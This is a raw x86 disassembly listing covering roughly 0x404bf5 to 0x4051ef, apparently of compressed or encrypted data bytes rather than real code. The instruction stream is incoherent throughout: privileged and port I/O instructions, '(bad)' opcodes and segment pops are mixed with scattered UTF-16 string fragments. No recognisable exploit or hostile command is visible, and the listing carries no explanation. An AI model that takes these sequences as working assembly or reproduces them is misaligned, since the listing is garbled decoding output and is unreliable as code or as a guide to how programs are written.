  404bf5:	29 d1                	sub    %edx,%ecx
  404bf7:	97                   	xchg   %eax,%edi
  404bf8:	67 00 ff             	addr16 add %bh,%bh
  404bfb:	b4 17                	mov    $0x17,%ah
  404bfd:	0d 30 df ff 94       	or     $0x94ffdf30,%eax
  404c02:	10 11                	adc    %dl,(%ecx)
  404c04:	5f                   	pop    %edi
  404c05:	34 93                	xor    $0x93,%al
  404c07:	ae                   	scas   %es:(%edi),%al
  404c08:	11 29                	adc    %ebp,(%ecx)
  404c0a:	32 50 39             	xor    0x39(%eax),%dl
  404c0d:	5f                   	pop    %edi
  404c0e:	34 df                	xor    $0xdf,%al
  404c10:	3f                   	aas
  404c11:	0d 3f 0d df 64       	or     $0x64df0d3f,%eax
  404c16:	b5 a4                	mov    $0xa4,%ch
  404c18:	11 7d 73             	adc    %edi,0x73(%ebp)
  404c1b:	f0 18 11             	lock sbb %dl,(%ecx)
  404c1e:	0d 7a 79 d0 0b       	or     $0xbd0797a,%eax
  404c23:	64 5f                	fs pop %edi
  404c25:	09 5f 09             	or     %ebx,0x9(%edi)
  404c28:	f0 8b 53 09          	lock mov 0x9(%ebx),%edx
  404c2c:	39 7d 30             	cmp    %edi,0x30(%ebp)
  404c2f:	3f                   	aas
  404c30:	37                   	aaa
  404c31:	5f                   	pop    %edi
  404c32:	09 f0                	or     %esi,%eax
  404c34:	04 5f                	add    $0x5f,%al
  404c36:	09 5f 09             	or     %ebx,0x9(%edi)
  404c39:	55                   	push   %ebp
  404c3a:	09 35 f5 d0 cc 33    	or     %esi,0x33ccd0f5
  404c40:	90                   	nop
  404c41:	77 43                	ja     0x404c86
  404c43:	90                   	nop
  404c44:	06                   	push   %es
  404c45:	73 32                	jae    0x404c79
  404c47:	31 6a 5f             	xor    %ebp,0x5f(%edx)
  404c4a:	7b bf                	jnp    0x404c0b
  404c4c:	51                   	push   %ecx
  404c4d:	16                   	push   %ss
  404c4e:	79 7c                	jns    0x404ccc
  404c50:	51                   	push   %ecx
  404c51:	31 f1                	xor    %esi,%ecx
  404c53:	0b b1 06 31 2e 30    	or     0x302e3106(%ecx),%esi
  404c59:	f2 16                	repnz push %ss
  404c5b:	6f                   	outsl  %ds:(%esi),(%dx)
  404c5c:	51                   	push   %ecx
  404c5d:	02 37                	add    (%edi),%dh
  404c5f:	ae                   	scas   %es:(%edi),%al
  404c60:	fb                   	sti
  404c61:	8e 91 02 28 70 1b    	mov    0x1b702802(%ecx),%ss
  404c67:	b1 c0                	mov    $0xc0,%cl
  404c69:	6c                   	insb   (%dx),%es:(%edi)
  404c6a:	2f                   	das
  404c6b:	30 41 f1             	xor    %al,-0xf(%ecx)
  404c6e:	19 5d 05             	sbb    %ebx,0x5(%ebp)
  404c71:	1f                   	pop    %ds
  404c72:	03 48 50             	add    0x50(%eax),%ecx
  404c75:	38 54 00 3a          	cmp    %dl,0x3a(%eax,%eax,1)
  404c79:	50                   	push   %eax
  404c7a:	b0 c8                	mov    $0xc8,%al
  404c7c:	31 b0 41 d1 32 d3    	xor    %esi,-0x2ccd2ebf(%eax)
  404c82:	06                   	push   %es
  404c83:	20 00                	and    %al,(%eax)
  404c85:	76 4f                	jbe    0x404cd6
  404c87:	50                   	push   %eax
  404c88:	db 91 29 41 50 c4    	fistl  -0x3bafbed7(%ecx)
  404c8e:	31 a6 91 2d 2d eb    	xor    %esp,-0x14d2d26f(%esi)
  404c94:	30 a6 91 c8 67 d0    	xor    %ah,-0x2f98376f(%esi)
  404c9a:	14 73                	adc    $0x73,%al
  404c9c:	92                   	xchg   %eax,%edx
  404c9d:	9e                   	sahf
  404c9e:	f7 55 b1             	notl   -0x4f(%ebp)
  404ca1:	02 57 51             	add    0x51(%edi),%dl
  404ca4:	0b b1 10 93 a0 2d    	or     0x2da09310(%ecx),%esi
  404caa:	b0 05                	mov    $0x5,%al
  404cac:	79 f0                	jns    0x404c9e
  404cae:	3f                   	aas
  404caf:	65 55                	gs push %ebp
  404cb1:	92                   	xchg   %eax,%edx
  404cb2:	02 61 90             	add    -0x70(%ecx),%ah
  404cb5:	00 70 b2             	add    %dh,-0x4e(%eax)
  404cb8:	50                   	push   %eax
  404cb9:	63 f2                	arpl   %esi,%edx
  404cbb:	32 69 55             	xor    0x55(%ecx),%ch
  404cbe:	70 26                	jo     0x404ce6
  404cc0:	6e                   	outsb  %ds:(%esi),(%dx)
  404cc1:	70 07                	jo     0x404cca
  404cc3:	78 50                	js     0x404d15
  404cc5:	33 6c 92 19          	xor    0x19(%edx,%edx,4),%ebp
  404cc9:	45                   	inc    %ebp
  404cca:	57                   	push   %edi
  404ccb:	f0 02 31             	lock add (%ecx),%dh
  404cce:	ce                   	into
  404ccf:	91                   	xchg   %eax,%ecx
  404cd0:	0c 22                	or     $0x22,%al
  404cd2:	50                   	push   %eax
  404cd3:	c1 61 10 18          	shll   $0x18,0x10(%ecx)
  404cd7:	66 55                	push   %bp
  404cd9:	d0 07                	rolb   $1,(%edi)
  404cdb:	64 b0 96             	fs mov $0x96,%al
  404cde:	31 b0 e1 35 30 6d    	xor    %esi,0x6d3035e1(%eax)
  404ce4:	35 55 b0 03 30       	xor    $0x3003b055,%eax
  404ce9:	d0 07                	rolb   $1,(%edi)
  404ceb:	35 70 01 66 d0       	xor    $0xd0660170,%eax
  404cf0:	ce                   	into
  404cf1:	30 b5 f0 00 61 b0    	xor    %dh,-0x4f9eff10(%ebp)
  404cf7:	00 30                	add    %dh,(%eax)
  404cf9:	30 c4                	xor    %al,%ah
  404cfb:	f1                   	int1
  404cfc:	12 32                	adc    (%edx),%dh
  404cfe:	50                   	push   %eax
  404cff:	4e                   	dec    %esi
  404d00:	ba 38 f0 16 31       	mov    $0x3116f038,%edx
  404d05:	30 07                	xor    %al,(%edi)
  404d07:	d1 4a f1             	rorl   $1,-0xf(%edx)
  404d0a:	00 36                	add    %dh,(%esi)
  404d0c:	f2 00 aa 37 50 04 39 	repnz add %ch,0x39045037(%edx)
  404d13:	30 0e                	xor    %cl,(%esi)
  404d15:	32 52 04             	xor    0x4(%edx),%dl
  404d18:	38 f0                	cmp    %dh,%al
  404d1a:	05 b6 39 50 e1       	add    $0xe15039b6,%eax
  404d1f:	51                   	push   %ecx
  404d20:	0b 4c 30 04          	or     0x4(%eax,%esi,1),%ecx
  404d24:	71 22                	jno    0x404d48
  404d26:	2d 70 d6 5a 6f       	sub    $0x6f5ad670,%eax
  404d2b:	90                   	nop
  404d2c:	c2 69 70             	ret    $0x7069
  404d2f:	05 31 41 64 72       	add    $0x72644131,%eax
  404d34:	0b 4d 6b             	or     0x6b(%ebp),%ecx
  404d37:	72 0a                	jb     0x404d43
  404d39:	d1 14 32             	rcll   $1,(%edx,%esi,1)
  404d3c:	d0 a1 20 50 df 11    	shlb   $1,0x11df5020(%ecx)
  404d42:	16                   	push   %ss
  404d43:	20 7b 92             	and    %bh,-0x6e(%ebx)
  404d46:	a2 15 2d 35 90       	mov    %al,0x90352d15
  404d4b:	02 d1                	add    %cl,%dl
  404d4d:	01 51 3a             	add    %edx,0x3a(%ecx)
  404d50:	51                   	push   %ecx
  404d51:	77 47                	ja     0x404d9a
  404d53:	ad                   	lods   %ds:(%esi),%eax
  404d54:	90                   	nop
  404d55:	04 54                	add    $0x54,%al
  404d57:	32 0d d1 c9 72 d2    	xor    0xd272c9d1,%cl
  404d5d:	b9 72 d2 04 ae       	mov    $0xae04d272,%ecx
  404d62:	41                   	inc    %ecx
  404d63:	30 36                	xor    %dh,(%esi)
  404d65:	b1 9b                	mov    $0x9b,%cl
  404d67:	f1                   	int1
  404d68:	5d                   	pop    %ebp
  404d69:	4e                   	dec    %esi
  404d6a:	70 0c                	jo     0x404d78
  404d6c:	74 92                	je     0x404d00
  404d6e:	7c 8e                	jl     0x404cfe
  404d70:	6f                   	outsl  %ds:(%esi),(%dx)
  404d71:	f0 7b d3             	lock jnp 0x404d47
  404d74:	dd 5f 14             	fstpl  0x14(%edi)
  404d77:	2d 00 4c 70 02       	sub    $0x2704c00,%eax
  404d7c:	de 6e 90             	fisubrs -0x70(%esi)
  404d7f:	39 d1                	cmp    %edx,%ecx
  404d81:	38 b1 11 71 0d 33    	cmp    %dh,0x330d7111(%ecx)
  404d87:	f0 0b b1 02 7e 44 b0 	lock or -0x4fbb81fe(%ecx),%esi
  404d8e:	0b 51 53             	or     0x53(%ecx),%edx
  404d91:	71 01                	jno    0x404d94
  404d93:	9f                   	lahf
  404d94:	0a 9f 0a 5b e6 20    	or     0x20e65b0a(%edi),%bl
  404d9a:	fd                   	std
  404d9b:	90                   	nop
  404d9c:	eb 4d                	jmp    0x404deb
  404d9e:	50                   	push   %eax
  404d9f:	17                   	pop    %ss
  404da0:	57                   	push   %edi
  404da1:	07                   	pop    %es
  404da2:	71 c2                	jno    0x404d66
  404da4:	31 5a d3             	xor    %ebx,-0x2d(%edx)
  404da7:	19 51 05             	sbb    %edx,0x5(%ecx)
  404daa:	aa                   	stos   %al,%es:(%edi)
  404dab:	6b d0 07             	imul   $0x7,%eax,%edx
  404dae:	65 b0 1b             	gs mov $0x1b,%al
  404db1:	2d 90 06 6c f0       	sub    $0xf06c0690,%eax
  404db6:	3f                   	aas
  404db7:	ee                   	out    %al,(%dx)
  404db8:	76 f0                	jbe    0x404daa
  404dba:	00 f1                	add    %dh,%cl
  404dbc:	02 35 00 30 f0 14    	add    0x14f03000,%dh
  404dc2:	ff                   	ljmp   (bad)
  404dc3:	ec                   	in     (%dx),%al
  404dc4:	31 0a                	xor    %ecx,(%edx)
  404dc6:	01 b1 72 e5 b4 00    	add    %esi,0xb4e572(%ecx)
  404dcc:	33 00                	xor    (%eax),%eax
  404dce:	3a 00                	cmp    (%eax),%al
  404dd0:	31 00                	xor    %eax,(%eax)
  404dd2:	32 00                	xor    (%eax),%al
  404dd4:	00 2e                	add    %ch,(%esi)
  404dd6:	00 39                	add    %bh,(%ecx)
  404dd8:	00 34 00             	add    %dh,(%eax,%eax,1)
  404ddb:	37                   	aaa
  404ddc:	00 00                	add    %al,(%eax)
  404dde:	20 00                	and    %al,(%eax)
  404de0:	57                   	push   %edi
  404de1:	00 65 00             	add    %ah,0x0(%ebp)
  404de4:	62 00                	bound  %eax,(%eax)
  404de6:	20 43 00             	and    %al,0x0(%ebx)
  404de9:	6c                   	insb   (%dx),%es:(%edi)
  404dea:	00 69 00             	add    %ch,0x0(%ecx)
  404ded:	48                   	dec    %eax
  404dee:	6e                   	outsb  %ds:(%esi),(%dx)
  404def:	00 46 74             	add    %al,0x74(%esi)
  404df2:	00 84 11 54 28 00 30 	add    %al,0x30002854(%ecx,%edx,1)
  404df9:	06                   	push   %es
  404dfa:	04 31                	add    $0x31,%al
  404dfc:	01 00                	add    %eax,(%eax)
  404dfe:	72 43                	jb     0x404e43
  404e00:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  404e04:	00 35 40 00 42 00    	add    %dh,0x420040
  404e0a:	33 00                	xor    (%eax),%eax
  404e0c:	36 00 7e 30          	add    %bh,%ss:0x30(%esi)
  404e10:	04 00                	add    $0x0,%al
  404e12:	29 02                	sub    %eax,(%edx)
  404e14:	72 4f                	jb     0x404e65
  404e16:	00 6e 00             	add    %ch,0x0(%esi)
  404e19:	53                   	push   %ebx
  404e1a:	51                   	push   %ecx
  404e1b:	00 8a 6f 00 70 00    	add    %cl,0x70006f(%edx)
  404e21:	36 69 00 1a 64 41 00 	imul   $0x41641a,%ss:(%eax),%eax
  404e28:	b2 6e                	mov    $0x6e,%dl
  404e2a:	00 67 00             	add    %ah,0x0(%edi)
  404e2d:	28 00                	sub    %al,(%eax)
  404e2f:	42                   	inc    %edx
  404e30:	2c 41                	sub    $0x41,%al
  404e32:	00 71 68             	add    %dh,0x68(%ecx)
  404e35:	00 72 00             	add    %dh,0x0(%edx)
  404e38:	3d 00 4b 78 07       	cmp    $0x7784b00,%eax
  404e3d:	06                   	push   %es
  404e3e:	4f                   	dec    %edi
  404e3f:	05 59 01 1d 77       	add    $0x771d0159,%eax
  404e44:	00 7a 00             	add    %bh,0x0(%edx)
  404e47:	45                   	inc    %ebp
  404e48:	11 00                	adc    %eax,(%eax)
  404e4a:	21 72 00             	and    %esi,0x0(%edx)
  404e4d:	6f                   	outsl  %ds:(%esi),(%dx)
  404e4e:	02 27                	add    (%edi),%ah
  404e50:	5b                   	pop    %ebx
  404e51:	00 5d 10             	add    %bl,0x10(%ebp)
  404e54:	00 0d 00 0a 00 2b    	add    %cl,0x2b000a00
  404e5a:	37                   	aaa
  404e5b:	00 2f                	add    %ch,(%edi)
  404e5d:	d5 00                	aad    $0x0
  404e5f:	b9 32 02 05 30       	mov    $0x30050232,%ecx
  404e64:	00 09                	add    %cl,(%ecx)
  404e66:	34 00                	xor    $0x0,%al
  404e68:	4b                   	dec    %ebx
  404e69:	01 89 36 3a 00 1b    	add    %ecx,0x1b003a36(%ecx)
  404e6f:	0b d7                	or     %edi,%edx
  404e71:	38 00                	cmp    %al,(%eax)
  404e73:	19 4d d7             	sbb    %ecx,-0x29(%ebp)
  404e76:	57                   	push   %edi
  404e77:	00 5a 61             	add    %bl,0x61(%edx)
  404e7a:	80 63 74 80          	andb   $0x80,0x74(%ebx)
  404e7e:	79 81                	jns    0x404e01
  404e80:	4b                   	dec    %ebx
  404e81:	44                   	inc    %esp
  404e82:	80 4e 77 05          	orb    $0x5,0x77(%esi)
  404e86:	80 6d 6c 80          	subb   $0x80,0x6c(%ebp)
  404e8a:	03 61 00             	add    0x0(%ecx),%esp
  404e8d:	64 00 41 d5          	add    %al,%fs:-0x2b(%ecx)
  404e91:	80 78 74 80          	cmpb   $0x80,0x74(%eax)
  404e95:	9f                   	lahf
  404e96:	6d                   	insl   (%dx),%es:(%edi)
  404e97:	80 7a 74 82          	cmpb   $0x82,0x74(%edx)
  404e9b:	74 ff                	je     0x404e9c
  404e9d:	59                   	pop    %ecx
  404e9e:	a3 81 e2 89 59       	mov    %eax,0x5989e281
  404ea3:	4d                   	dec    %ebp
  404ea4:	00 75 80             	add    %dh,-0x80(%ebp)
  404ea7:	f2 74 40             	bnd je 0x404eea
  404eaa:	31 a2 70 c0 01 65    	xor    %esp,0x6501c070(%edx)
  404eb0:	00 4f c0             	add    %cl,-0x40(%edi)
  404eb3:	7d 6a                	jge    0x404f1f
  404eb5:	c0 2c 8a 63          	shrb   $0x63,(%edx,%ecx,4)
  404eb9:	c0 2e 73             	shrb   $0x73,(%esi)
  404ebc:	c2 2c 20             	ret    $0x202c
  404ebf:	00 54 c0 5c          	add    %dl,0x5c(%eax,%eax,8)
  404ec3:	d2 79 40             	sarb   %cl,0x40(%ecx)
  404ec6:	73 6f                	jae    0x404f37
  404ec8:	00 41 32             	add    %al,0x32(%ecx)
  404ecb:	6c                   	insb   (%dx),%es:(%edi)
  404ecc:	40                   	inc    %eax
  404ecd:	07                   	pop    %es
  404ece:	41                   	inc    %ecx
  404ecf:	35 aa 64 c0 53       	xor    $0x53c064aa,%eax
  404ed4:	77 c0                	ja     0x404e96
  404ed6:	3f                   	aas
  404ed7:	73 c0                	jae    0x404e99
  404ed9:	01 73 c0             	add    %esi,-0x40(%ebx)
  404edc:	0f ea 67 40          	pminsw 0x40(%edi),%mm4
  404ee0:	3e 61                	ds popa
  404ee2:	c2 10 64             	ret    $0x6410
  404ee5:	40                   	inc    %eax
  404ee6:	92                   	xchg   %eax,%edx
  404ee7:	7f 3a                	jg     0x404f23
  404ee9:	7f 9d                	jg     0x404e88
  404eeb:	55                   	push   %ebp
  404eec:	cd 63                	int    $0x63
  404eee:	20 40 2b             	and    %al,0x2b(%eax)
  404ef1:	74 c0                	je     0x404eb3
  404ef3:	35 65 c2 31 74       	xor    $0x7431c265,%eax
  404ef8:	15 c0 2d 23 40       	adc    $0x40232dc0,%eax
  404efd:	89 20                	mov    %esp,(%eax)
  404eff:	40                   	inc    %eax
  404f00:	37                   	aaa
  404f01:	65 00 73 b9          	add    %dh,%gs:-0x47(%ebx)
  404f05:	c4 41 20             	les    0x20(%ecx),%eax
  404f08:	00 57 a2             	add    %dl,-0x5e(%edi)
  404f0b:	ff 34 ff             	push   (%edi,%edi,8)
  404f0e:	34 42                	xor    $0x42,%al
  404f10:	c0 30 d8             	shlb   $0xd8,(%eax)
  404f13:	63 00                	arpl   %eax,(%eax)
  404f15:	6b 40 ce c1          	imul   $0xffffffc1,-0x32(%eax),%eax
  404f19:	c2 75 c0             	ret    $0xc075
  404f1c:	5c                   	pop    %esp
  404f1d:	c1 61 1a 74          	shll   $0x74,0x1a(%ecx)
  404f21:	42                   	inc    %edx
  404f22:	2d 65 c0 06 41       	sub    $0x4106c065,%eax
  404f27:	03 65 00             	add    0x0(%ebp),%esp
  404f2a:	78 df                	js     0x404f0b
  404f2c:	c0 63 c1 74          	shlb   $0x74,-0x3f(%ebx)
  404f30:	41                   	inc    %ecx
  404f31:	d8 5b d7             	fcomps -0x29(%ebx)
  404f34:	eb 34                	jmp    0x404f6a
  404f36:	35 20 6c 21 48       	xor    $0x48216c20,%eax
  404f3b:	af                   	scas   %es:(%edi),%eax
  404f3c:	bf 83 21 1d bf       	mov    $0xbf1d2183,%edi
  404f41:	83 a3 83 64 20 4a 73 	andl   $0x73,0x4a206483(%ebx)
  404f48:	e0 32                	loopne 0x404f7c
  404f4a:	f5                   	cmc
  404f4b:	21 1a                	and    %ebx,(%edx)
  404f4d:	79 60                	jns    0x404faf
  404f4f:	01 64 7f 7b          	add    %esp,0x7b(%edi,%edi,2)
  404f53:	e0 8b                	loopne 0x404ee0
  404f55:	67 96                	addr16 xchg %eax,%esi
  404f57:	a3 12 aa 46 20       	mov    %eax,0x2046aa12
  404f5c:	8c 4d 20             	mov    %cs,0x20(%ebp)
  404f5f:	20 6e 60             	and    %ch,0x60(%esi)
  404f62:	00 67 a0             	add    %ah,-0x60(%edi)
  404f65:	08 a8 72 00 49 e2    	or     %ch,-0x1db6ff8e(%eax)
  404f6b:	3c 6c                	cmp    $0x6c,%al
  404f6d:	22 90 45 60 22 16    	and    0x16226045(%eax),%dl
  404f73:	70 a0                	jo     0x404f15
  404f75:	02 e1                	add    %cl,%ah
  404f77:	5a                   	pop    %edx
  404f78:	65 60                	gs pusha
  404f7a:	73 20                	jae    0x404f9c
  404f7c:	00 48 55             	add    %cl,0x55(%eax)
  404f7f:	e0 04                	loopne 0x404f85
  404f81:	73 e0                	jae    0x404f63
  404f83:	26 20 a0 75 66 60 41 	and    %ah,%es:0x41606675(%eax)
  404f8a:	66 03 60 26          	add    0x26(%eax),%sp
  404f8e:	61                   	popa
  404f8f:	5b                   	pop    %ebx
  404f90:	20 00                	and    %al,(%eax)
  404f92:	22 00                	and    (%eax),%al
  404f94:	25 00 2a 55 20       	and    $0x20552a00,%eax
  404f99:	42                   	inc    %edx
  404f9a:	65 20 43 50          	and    %al,%gs:0x50(%ebx)
  404f9e:	60                   	pusha
  404f9f:	00 6f 00             	add    %ch,0x0(%edi)
  404fa2:	11 65 03             	adc    %esp,0x3(%ebp)
  404fa5:	25 00 5c a0 61       	and    $0x61a05c00,%eax
  404faa:	6d                   	insl   (%dx),%es:(%edi)
  404fab:	00 59 51             	add    %bl,0x51(%ecx)
  404fae:	e2 91                	loop   0x404f41
  404fb0:	4f                   	dec    %edi
  404fb1:	00 71 e0             	add    %dh,-0x20(%ecx)
  404fb4:	04 77                	add    $0x77,%al
  404fb6:	e0 7c                	loopne 0x405034
  404fb8:	36 55                	ss push %ebp
  404fba:	e0 66                	loopne 0x405022
  404fbc:	56                   	push   %esi
  404fbd:	20 0c 6a             	and    %cl,(%edx,%ebp,2)
  404fc0:	a2 94 4b 60 04       	mov    %al,0x4604b94
  404fc5:	63 50 00             	arpl   %edx,0x0(%eax)
  404fc8:	47                   	inc    %edi
  404fc9:	00 51 a0             	add    %dl,-0x60(%ecx)
  404fcc:	05 36 a0 02 69       	add    $0x6902a036,%eax
  404fd1:	11 a0 05 57 00 52    	adc    %esp,0x52005705(%eax)
  404fd7:	20 a2 61 00 4e 15    	and    %ah,0x154e0061(%edx)
  404fdd:	a0 0c 65 62 a3       	mov    0xa362650c,%al
  404fe2:	73 20                	jae    0x405004
  404fe4:	a1 56 00 4a b4       	mov    0xb44a0056,%eax
  404fe9:	00 6a 60             	add    %ch,0x60(%edx)
  404fec:	50                   	push   %eax
  404fed:	7a 20                	jp     0x40500f
  404fef:	12 a1 05 53 a0 6c    	adc    0x6ca05305(%ecx),%ah
  404ff5:	a8 44                	test   $0x44,%al
  404ff7:	00 38                	add    %bh,(%eax)
  404ff9:	60                   	pusha
  404ffa:	07                   	pop    %es
  404ffb:	44                   	inc    %esp
  404ffc:	a0 12 58 a0 0a       	mov    0xaa05812,%al
  405001:	aa                   	stos   %al,%es:(%edi)
  405002:	45                   	inc    %ebp
  405003:	20 04 36             	and    %al,(%esi,%esi,1)
  405006:	a0 aa 30 20 1e       	mov    0x1e2030aa,%al
  40500b:	4b                   	dec    %ebx
  40500c:	e0 8c                	loopne 0x404f9a
  40500e:	aa                   	stos   %al,%es:(%edi)
  40500f:	4d                   	dec    %ebp
  405010:	20 b5 41 e0 0f 51    	and    %dh,0x510fe041(%ebp)
  405016:	e0 02                	loopne 0x40501a
  405018:	74 e2                	je     0x404ffc
  40501a:	0f aa                	rsm
  40501c:	34 a0                	xor    $0xa0,%al
  40501e:	13 35 60 08 53 20    	adc    0x20530860,%esi
  405024:	0c 35                	or     $0x35,%al
  405026:	a0 03 aa 6b e0       	mov    0xe06baa03,%al
  40502b:	11 7a 60             	adc    %edi,0x60(%edx)
  40502e:	02 61 a2             	add    -0x5e(%ecx),%ah
  405031:	17                   	pop    %ss
  405032:	44                   	inc    %esp
  405033:	60                   	pusha
  405034:	05 aa 5c e0 04       	add    $0x4e05caa,%eax
  405039:	68 e0 0e 39 60       	push   $0x60390ee0
  40503e:	7b 41                	jnp    0x405081
  405040:	20 46 2a             	and    %al,0x2a(%esi)
  405043:	78 60                	js     0x4050a5
  405045:	1f                   	pop    %ds
  405046:	5f                   	pop    %edi
  405047:	20 06                	and    %al,(%esi)
  405049:	32 e0                	xor    %al,%ah
  40504b:	bd 6a 00 a2 4d       	mov    $0x4da2006a,%ebp
  405050:	a0 11 66 00 2d       	mov    0x2d006611,%al
  405055:	e0 2f                	loopne 0x405086
  405057:	49                   	dec    %ecx
  405058:	20 b7 0a 5a 20 08    	and    %dh,0x8205a0a(%edi)
  40505e:	4e                   	dec    %esi
  40505f:	a0 11 63 00 50       	mov    0x50006311,%al
  405064:	00 aa 5f 20 18 5a    	add    %ch,0x5a18205f(%edx)
  40506a:	60                   	pusha
  40506b:	17                   	pop    %ss
  40506c:	79 60                	jns    0x4050ce
  40506e:	11 74 e0 01          	adc    %esi,0x1(%eax,%eiz,8)
  405072:	8a 33                	mov    (%ebx),%dh
  405074:	a0 4e 74 e0 01       	mov    0x1e0744e,%al
  405079:	4e                   	dec    %esi
  40507a:	00 4c 20 14          	add    %cl,0x14(%eax,%eiz,1)
  40507e:	8a 4d a0             	mov    -0x60(%ebp),%cl
  405081:	1b 48 20             	sbb    0x20(%eax),%ecx
  405084:	c5 6a 00             	lds    0x0(%edx),%ebp
  405087:	56                   	push   %esi
  405088:	a0 c6 aa 45 e0       	mov    0xe045aac6,%al
  40508d:	02 71 60             	add    0x60(%ecx),%dh
  405090:	0b 6e 60             	or     0x60(%esi),%ebp
  405093:	0b 35 20 0f 8a 32    	or     0x328a0f20,%esi
  405099:	e0 0a                	loopne 0x4050a5
  40509b:	33 a0 81 75 00 63    	xor    0x63007581(%eax),%esp
  4050a1:	60                   	pusha
  4050a2:	2c aa                	sub    $0xaa,%al
  4050a4:	30 62 21             	xor    %ah,0x21(%edx)
  4050a7:	78 20                	js     0x4050c9
  4050a9:	0d 6d a0 1e 63       	or     $0x631ea06d,%eax
  4050ae:	e0 10                	loopne 0x4050c0
  4050b0:	aa                   	stos   %al,%es:(%edi)
  4050b1:	5f                   	pop    %edi
  4050b2:	60                   	pusha
  4050b3:	00 47 e0             	add    %al,-0x20(%edi)
  4050b6:	08 73 a0             	or     %dh,-0x60(%ebx)
  4050b9:	1d 79 62 12 aa       	sbb    $0xaa126279,%eax
  4050be:	6f                   	outsl  %ds:(%esi),(%dx)
  4050bf:	a0 05 52 20 0d       	mov    0xd205205,%al
  4050c4:	47                   	inc    %edi
  4050c5:	20 13                	and    %dl,(%ebx)
  4050c7:	67 20 88 7a 78       	and    %cl,0x787a(%bx,%si)
  4050cc:	a0 37 6c 60 31       	mov    0x31606c37,%al
  4050d1:	e1 57                	loope  0x40512a
  4050d3:	65 35 21 c4 44 55    	gs xor $0x5544c421,%eax
  4050d9:	e0 36                	loopne 0x405111
  4050db:	58                   	pop    %eax
  4050dc:	20 aa 38 60 1c 54    	and    %ch,0x541c6038(%edx)
  4050e2:	a0 08 68 55 e0       	mov    0xe0556808,%al
  4050e7:	01 6a e0             	add    %ebp,-0x20(%edx)
  4050ea:	bf 31 20 18 35       	mov    $0x35182031,%edi
  4050ef:	e0 02                	loopne 0x4050f3
  4050f1:	43                   	inc    %ebx
  4050f2:	55                   	push   %ebp
  4050f3:	20 0e                	and    %cl,(%esi)
  4050f5:	35 20 0d 63 e0       	xor    $0xe0630d20,%eax
  4050fa:	02 64 20 19          	add    0x19(%eax,%eiz,1),%ah
  4050fe:	76 51                	jbe    0x405151
  405100:	e0 01                	loopne 0x405103
  405102:	70 00                	jo     0x405104
  405104:	76 20                	jbe    0x405126
  405106:	57                   	push   %edi
  405107:	70 e0                	jo     0x4050e9
  405109:	66 69 d5 60 13       	imul   $0x1360,%bp,%dx
  40510e:	46                   	inc    %esi
  40510f:	60                   	pusha
  405110:	14 41                	adc    $0x41,%al
  405112:	a0 16 73 20 26       	mov    0x26207316,%al
  405117:	e1 69                	loope  0x405182
  405119:	56                   	push   %esi
  40511a:	73 20                	jae    0x40513c
  40511c:	cf                   	iret
  40511d:	a1 0c 49 60 3e       	mov    0x3e60490c,%eax
  405122:	53                   	push   %ebx
  405123:	a0 15 61 ac 00       	mov    0xac6115,%al
  405128:	77 a0                	ja     0x4050ca
  40512a:	05 61 08 3d 60       	add    $0x603d0861,%eax
  40512f:	0a 72 20             	or     0x20(%edx),%dh
  405132:	83 5e 65 3f          	sbbl   $0x3f,0x65(%esi)
  405136:	52                   	push   %edx
  405137:	3f                   	aas
  405138:	52                   	push   %edx
  405139:	20 0f                	and    %cl,(%edi)
  40513b:	29 52 41             	sub    %edx,0x41(%edx)
  40513e:	e0 12                	loopne 0x405152
  405140:	74 f7                	je     0x405139
  405142:	60                   	pusha
  405143:	0b 61 a6             	or     -0x5a(%ecx),%esp
  405146:	bf 51 73 22 5a       	mov    $0x5a227351,%edi
  40514b:	bf 51 bf 51 bf       	mov    $0xbf51bf51,%edi
  405150:	51                   	push   %ecx
  405151:	73 df                	jae    0x405132
  405153:	28 df                	sub    %bl,%bh
  405155:	28 33                	sub    %dh,(%ebx)
  405157:	00 df                	add    %bl,%bh
  405159:	28 d1                	sub    %dl,%cl
  40515b:	30 df                	xor    %bl,%bh
  40515d:	28 41 b5             	sub    %al,-0x4b(%ecx)
  405160:	90                   	nop
  405161:	21 66 b0             	and    %esp,-0x50(%esi)
  405164:	18 72 10             	sbb    %dh,0x10(%edx)
  405167:	24 df                	and    $0xdf,%al
  405169:	28 6e f0             	sub    %ch,-0x10(%esi)
  40516c:	31 76 48             	xor    %esi,0x48(%esi)
  40516f:	90                   	nop
  405170:	26 b1 7b             	es mov $0x7b,%cl
  405173:	39 b0 30 df 28 df    	cmp    %esi,-0x20d720d0(%eax)
  405179:	28 6f d5             	sub    %ch,-0x2b(%edi)
  40517c:	50                   	push   %eax
  40517d:	19 50 f0             	sbb    %edx,-0x10(%eax)
  405180:	16                   	push   %ss
  405181:	67 70 00             	addr16 jo 0x405184
  405184:	7a 10                	jp     0x405196
  405186:	35 df 28 f5 df       	xor    $0xdff528df,%eax
  40518b:	28 4d f0             	sub    %cl,-0x10(%ebp)
  40518e:	02 6c d0 16          	add    0x16(%eax,%edx,8),%ch
  405192:	df 28                	fildll (%eax)
  405194:	df 28                	fildll (%eax)
  405196:	31 09                	xor    %ecx,(%ecx)
  405198:	e5 df                	in     $0xdf,%eax
  40519a:	28 6d f0             	sub    %ch,-0x10(%ebp)
  40519d:	29 22                	sub    %esp,(%edx)
  40519f:	00 71 22             	add    %dh,0x22(%ecx)
  4051a2:	1f                   	pop    %ds
  4051a3:	62 b9 8a d5 bf 2a    	bound  %edi,0x2abfd58a(%ecx)
  4051a9:	70 30                	jo     0x4051db
  4051ab:	2e 66 30 41 62       	data16 xor %al,%cs:0x62(%ecx)
  4051b0:	b2 25                	mov    $0x25,%dl
  4051b2:	bf 2a d6 36 90       	mov    $0x9036d62a,%edi
  4051b7:	20 f1                	and    %dh,%cl
  4051b9:	82 64 50 2a 63       	andb   $0x63,0x2a(%eax,%edx,2)
  4051be:	10 2c bf             	adc    %ch,(%edi,%edi,4)
  4051c1:	2a aa 56 90 29 52    	sub    0x52299056(%edx),%ch
  4051c7:	90                   	nop
  4051c8:	33 61 70             	xor    0x70(%ecx),%esp
  4051cb:	00 3d bf 28 df b2    	add    %bh,0xb2df28bf
  4051d1:	3c 9f                	cmp    $0x9f,%al
  4051d3:	8f                   	(bad)
  4051d4:	13 9d df 51 df 51    	adc    0x51df51df(%ebp),%ebx
  4051da:	52                   	push   %edx
  4051db:	d0 25 17 70 ae 6f    	shlb   $1,0x6fae7017
  4051e1:	90                   	nop
  4051e2:	35 71 70 d1 06       	xor    $0x6d17071,%eax
  4051e7:	68 90 51 63 50       	push   $0x50635190
  4051ec:	39 55 91             	cmp    %edx,-0x6f(%ebp)
  4051ef:	7f 61                	jg     0x405252
